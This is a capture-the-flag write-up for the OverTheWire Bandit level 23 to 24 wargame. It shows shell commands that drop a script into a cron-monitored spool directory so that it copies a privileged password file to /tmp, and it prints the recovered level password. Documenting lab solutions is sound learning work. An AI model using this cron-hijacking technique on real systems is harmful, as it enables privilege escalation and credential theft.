# Bandit Level 23 ➔ Level 24

## 🧠 Goal:
There is a **cron job** running as `bandit24` which executes all scripts in `/var/spool/bandit24`.  
Your task is to create a script in that directory which will copy the password for `bandit24` to a location you can access.

---

## 🔐 Login:
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```

## 🛠️ Commands Used:
```bash
cd /tmp
mkdir myhack
cd myhack
echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit23_pass' > exploit.sh
chmod +x exploit.sh
cp exploit.sh /var/spool/bandit24/
cat /tmp/bandit23_pass
```

## 🧾 Password Found:
`UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ`

## 📘 What I Learned:
- How to exploit writable cron-monitored directories for privilege escalation.
-	That cron jobs can be hijacked by injecting scripts into expected paths.
-	The importance of script permissions and naming in scheduled automation.
